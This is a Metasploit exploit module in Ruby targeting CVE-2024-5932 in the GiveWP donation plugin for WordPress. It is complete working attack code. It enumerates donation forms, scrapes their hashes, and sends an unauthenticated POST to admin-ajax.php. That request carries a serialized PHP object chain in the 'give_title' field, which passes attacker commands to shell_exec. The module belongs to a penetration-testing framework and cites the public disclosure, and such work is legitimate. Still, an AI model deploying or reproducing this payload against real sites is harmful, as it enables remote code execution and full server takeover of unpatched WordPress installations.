##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HTTP::Wordpress
  prepend Msf::Exploit::Remote::AutoCheck

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GiveWP Unauthenticated Donation Process Exploit',
        'Description' => %q{
          The GiveWP Donation Plugin and Fundraising Platform plugin for WordPress is vulnerable to a PHP Object Injection (POI) attack.
          This vulnerability exists in all versions up to and including 3.14.1 due to improper handling of untrusted input in the 'give_title' parameter.
          The flaw allows unauthenticated attackers to inject a PHP object via the deserialization of this parameter.
          Exploiting this vulnerability can lead to arbitrary code execution, as the PHP Object Injection is leveraged to trigger a chain of property-oriented programming (POP) that facilitates remote code execution (RCE).
          Additionally, the attacker may gain the ability to delete arbitrary files on the affected server.
          This module interacts with the vulnerable endpoint by exploiting this weakness to execute arbitrary code on the server, potentially leading to full server compromise.
        },

        'License' => MSF_LICENSE,
        'Author' => [
          'Villu Orav',         # Initial Discovery
          'Valentin Lobstein',  # Metasploit Module
          'EQSTSeminar',        # Proof of Concept
        ],
        'References' => [
          ['CVE', '2024-5932'],
          ['URL', 'https://github.com/EQSTSeminar/CVE-2024-5932'],
          ['URL', 'https://www.rcesecurity.com/2024/08/wordpress-givewp-pop-to-rce-cve-2024-5932'],
          ['URL', 'https://www.wordfence.com/blog/2024/08/4998-bounty-awarded-and-100000-wordpress-sites-protected-against-unauthenticated-remote-code-execution-vulnerability-patched-in-givewp-wordpress-plugin']
        ],
        'DisclosureDate' => '2024-08-25',
        'Platform' => %w[unix linux win],
        'Arch' => [ARCH_CMD],
        'Privileged' => false,
        'Targets' => [
          [
            'Unix/Linux Command Shell',
            {
              'Platform' => %w[unix linux],
              'Arch' => ARCH_CMD
            }
          ],
          [
            'Windows Command Shell',
            {
              'Platform' => 'win',
              'Arch' => ARCH_CMD
            }
          ]
        ],
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        }
      )
      )
  end

  def check
    return CheckCode::Unknown unless wordpress_and_online?

    wp_version = wordpress_version
    print_status("WordPress Version: #{wp_version}") if wp_version

    check_code = check_plugin_version_from_readme('give', '3.14.2')

    if check_code.code != 'appears'
      return CheckCode::Safe
    end

    plugin_version = check_code.details[:version]
    print_good("Detected GiveWP Plugin version: #{plugin_version}")
    CheckCode::Appears
  end

  def exploit
    forms = connect_to_api

    if forms
      valid_forms = parse_forms(forms)

      send_exploit_requests(valid_forms)
    else
      fail_with(Failure::UnexpectedReply, 'Failed to connect to the GiveWP API.')
    end
  end

  def connect_to_api
    res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, '?give-api=v1/forms')
    )

    print_good('Successfully connected to the GiveWP API.') if res&.code == 200
    print_error('Failed to connect to the GiveWP API.') unless res&.code == 200

    JSON.parse(res.body)['forms'] if res&.code == 200
  end

  def parse_forms(forms)
    forms.each_with_object([]) do |form, valid_forms|
      form_id = form.dig('info', 'id')
      print_status("Analyzing Form ID: #{form_id}")

      form_data = retrieve_and_analyze_form(form_id)

      print_good("Form ID: #{form_id} has required fields.") if form_data
      print_error("Form ID: #{form_id} does not contain all required fields.") unless form_data

      valid_forms << form_data if form_data
    end
  end

  def retrieve_and_analyze_form(form_id)
    form_res = send_request_cgi(
      'method' => 'GET',
      'uri' => normalize_uri(target_uri.path, "?post_type=give_forms&p=#{form_id}")
    )

    return nil unless form_res&.code == 200

    doc = Nokogiri::HTML(form_res.body)
    give_form_id = doc.at_xpath('//input[@name="give-form-id"]/@value')&.text
    give_form_hash = doc.at_xpath('//input[@name="give-form-hash"]/@value')&.text
    button_tag = doc.at_xpath('//button[@data-price-id]')

    return nil unless give_form_id && give_form_hash && button_tag

    give_price_id = button_tag['data-price-id']
    give_amount = button_tag.text.strip

    {
      'give_form_id' => give_form_id,
      'give_form_hash' => give_form_hash,
      'give_price_id' => give_price_id,
      'give_amount' => give_amount
    }
  end

  def send_exploit_requests(valid_forms)
    print_status('Sending exploit payload...')
    valid_forms.each do |form_data|
      send_exploit_request(
        form_data['give_form_id'],
        form_data['give_form_hash'],
        form_data['give_price_id'],
        form_data['give_amount']
      )
    end
  end

  def send_exploit_request(give_form_id, give_form_hash, give_price_id, give_amount)
    final_payload = format(
      'O:19:"Stripe\\\\\\\\StripeObject":1:{s:10:"\\0*\\0_values";a:1:{s:3:"foo";' \
      'O:62:"Give\\\\\\\\PaymentGateways\\\\\\\\DataTransferObjects\\\\\\\\GiveInsertPaymentData":1:{' \
      's:8:"userInfo";a:1:{s:7:"address";O:4:"Give":1:{s:12:"\\0*\\0container";' \
      'O:33:"Give\\\\\\\\Vendors\\\\\\\\Faker\\\\\\\\ValidGenerator":3:{s:12:"\\0*\\0validator";' \
      's:10:"shell_exec";s:12:"\\0*\\0generator";' \
      'O:34:"Give\\\\\\\\Onboarding\\\\\\\\SettingsRepository":1:{' \
      's:11:"\\0*\\0settings";a:1:{s:8:"address1";s:%<length>d:"%<encoded>s";}}' \
      's:13:"\\0*\\0maxRetries";i:10;}}}}}}',
      length: payload.encoded.length,
      encoded: payload.encoded
    )

    data = {
      'give-form-id' => give_form_id,
      'give-form-hash' => give_form_hash,
      'give-price-id' => give_price_id,
      'give-amount' => give_amount,
      'give_first' => Faker::Name.first_name,
      'give_last' => Faker::Name.last_name,
      'give_email' => Faker::Internet.email,
      'give_title' => final_payload,
      'give-gateway' => 'offline',
      'action' => 'give_process_donation'
    }

    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, 'wp-admin/admin-ajax.php'),
      'headers' => {
        'Content-Type' => 'application/x-www-form-urlencoded; charset=UTF-8'
      },
      'data' => URI.encode_www_form(data)
    })
  end
end
